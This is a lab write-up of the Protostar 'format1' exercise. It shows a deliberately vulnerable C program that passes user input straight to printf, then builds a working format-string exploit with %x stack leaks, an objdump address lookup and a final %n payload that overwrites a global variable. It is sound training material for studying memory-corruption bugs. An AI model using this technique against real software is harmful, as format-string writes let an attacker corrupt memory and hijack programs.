This level shows how format strings can be used to modify arbitrary memory locations.

Hints

objdump -t is your friend, and your input string lies far up the stack :)
This level is at /opt/protostar/bin/format1
### Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

From reading the source code we find that user supplied input i.e. argv[1] is being passed directly into printf().

```bash
user@protostar:/opt/protostar/bin$ ./format1 AAAABBBB
AAAABBBBuser@protostar:/opt/protostar/bin$ 
```
We see that the program just prints what we supply in argv[1].

Let's see what happens when we pass a bunch of %x hex format specifiers as input.

![leak](pictures/format1.1.png)

```bash
user@protostar:/opt/protostar/bin$ ./format1 '%x %x %x %x %x %x %x '
804960c bffff7d8 8048469 b7fd8304 b7fd7ff4 bffff7d8 8048435 user@protostar:/opt/protostar/bin$ 
```

We can see some values which reside in memory this is crazy! if we look carefully these are the values contain the memory address of the stack the addressess starting bffff look familiar.

This is a memory leak vulnerability, with this we can leak values from program memory and possibly leaking stack addresses.

Since a variable is just an area in memory we can leverage printf to write to this specific address.

![leak](pictures/format1.2.png)
What this is doing is basically printing out some random addresses in stack memory. But more interesting thing is if we enter enough format string parameters, we can actually find the strings that we enter on the stack.

Let's find the address of the target variable using objdump

```bash
user@protostar:/opt/protostar/bin$ objdump -t format1 |grep -C 2 target
08049630 g       *ABS*  00000000              __bss_start
080483f4 g     F .text  00000028              vuln
08049638 g     O .bss   00000004              target
0804963c g       *ABS*  00000000              _end
00000000       F *UND*  00000000              puts@@GLIBC_2.0
user@protostar:/opt/protostar/bin$ 
```

great so the variable target is 0x08049638

Now instead of the 8 As we need to find how many %x we have to send so that the value we are writing should be reflected so instead of the 8 As we need to reflect exactly 4 As.

This requires a lot of hit and trial.

![reflect](pictures/format1.3.png)

This looks a lot better, we can clearly see the AAAA (41414141) and BBBB (42424242) being reflected.

Now the next step is to find the offset such that last value is user controlled data, this requires a lot of trial and error

```bash
user@protostar:/opt/protostar/bin$ ./format1 "`python -c 'print("AAAA" +"\x38\x96\x04\x08" + "BBBB"  +  " %x"*129 + "%x")'`"AAAA8BBBB 804960c bffff648 8048469 b7fd8304 b7fd7ff4 bffff648 8048435 bffff814 b7ff1040 804845b b7fd7ff4 8048450 0 bffff6c8 b7eadc76 2 bffff6f4 bffff700 b7fe1848 bffff6b0 ffffffff b7ffeff4 804824d 1 bffff6b0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6c8 85cdd11e af99070e 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff6f4 8048450 8048440 b7ff1040 bffff6ec b7fff8f8 2 bffff80a bffff814 0 bffff9a6 bffff9b4 bffff9c8 bffff9ec bffff9ff bffffa09 bffffef9 bfffff37 bfffff4b bfffff62 bfffff73 bfffff7b bfffff8b bfffff98 bfffffd0 bfffffdc 0 20 b7fe2414 21 b7fe2000 10 f8bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7eb 1f bffffff2 f bffff7fb 0 0 0 80000000 b8760014 ea30bd10 959ab3b5 69930730 363836 0 0 2f2e0000 6d726f66 317461 414141418049638
user@protostar:/opt/protostar/bin$
```

So after a lot of hit and trial we are able to make the target variable address that we supplied as user input as the last value being printed now inorder to write to this memory location we need to send a %n instead of %x as the last value so 
```bash
./format1 "`python -c 'print("AAAA" +"\x38\x96\x04\x08" + "BBBB"  +  " %x"*129 + "%x")'`"
```
We will change our exploit to

```
/format1 "`python -c 'print("AAAA" +"\x38\x96\x04\x08" + "BBBB"  +  " %x"*129 + "%n")'`"
```
```bash
user@protostar:/opt/protostar/bin$ ./format1 "`python -c 'print("AAAA" +"\x38\x96\x04\x08" + "BBBB"  +  " %x"*129 + "%n")'`"AAAA8BBBB 804960c bffff648 8048469 b7fd8304 b7fd7ff4 bffff648 8048435 bffff814 b7ff1040 804845b b7fd7ff4 8048450 0 bffff6c8 b7eadc76 2 bffff6f4 bffff700 b7fe1848 bffff6b0 ffffffff b7ffeff4 804824d 1 bffff6b0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6c8 737c24c7 5928f2d7 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff6f4 8048450 8048440 b7ff1040 bffff6ec b7fff8f8 2 bffff80a bffff814 0 bffff9a6 bffff9b4 bffff9c8 bffff9ec bffff9ff bffffa09 bffffef9 bfffff37 bfffff4b bfffff62 bfffff73 bfffff7b bfffff8b bfffff98 bfffffd0 bfffffdc 0 20 b7fe2414 21 b7fe2000 10 f8bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7eb 1f bffffff2 f bffff7fb 0 0 0 8b000000 4259ae50 3ddc4648 1a668b06 69222ef3 363836 0 0 2f2e0000 6d726f66 317461 41414141you have modified the target :)
user@protostar:/opt/protostar/bin$ 
```
![reflect](pictures/format1.4.png)

Great we successfully modified the target variable!
